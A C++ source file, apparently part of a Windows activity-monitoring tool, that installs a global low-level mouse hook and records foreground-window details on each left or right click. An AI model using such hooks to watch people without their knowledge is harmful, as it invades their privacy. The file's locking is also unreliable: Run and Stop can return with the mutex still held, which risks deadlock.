#include "services.hpp"

#if SERVICE_MOUSE_ENABLED

#include "winfx.hpp"
#include "tools.hpp"

#include <atomic>
#include <mutex>

using namespace Services;

namespace
{
	std::atomic_bool isRunning = false;

	std::mutex stateMutex;

	HHOOK hhkLowLevelMouse = NULL;

	LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
	{
		if (nCode == HC_ACTION)
		{
			switch (wParam)
			{
			case WM_LBUTTONDOWN:
				// Left mouse button down
				KeyboardWorker::Add(tools::GetWNDInfo(GetForegroundWindow()));
				break;
			case WM_RBUTTONDOWN:
				// Right mouse button down
				KeyboardWorker::Add(tools::GetWNDInfo(GetForegroundWindow()));
				break;
			}
		}

		return CallNextHookEx(hhkLowLevelMouse, nCode, wParam, lParam);
	}
}

void MouseSvc::Run()
{
	stateMutex.lock();

	if (isRunning.load())
	{
		return;
	}

	if (hhkLowLevelMouse == NULL)
	{
		hhkLowLevelMouse = SetWindowsHookExW(WH_MOUSE_LL, LowLevelMouseProc, NULL, NULL);
	}

	isRunning.store(true);

	stateMutex.unlock();
}

void MouseSvc::Stop()
{
	stateMutex.lock();

	if (!isRunning)
	{
		return;
	}

	if (hhkLowLevelMouse != NULL)
	{
		UnhookWindowsHookEx(hhkLowLevelMouse);
		hhkLowLevelMouse = NULL;
	}

	isRunning = false;

	stateMutex.unlock();
}

bool MouseSvc::IsRunning()
{
	return isRunning.load();
}

#endif // SERVICE_MOUSE_ENABLED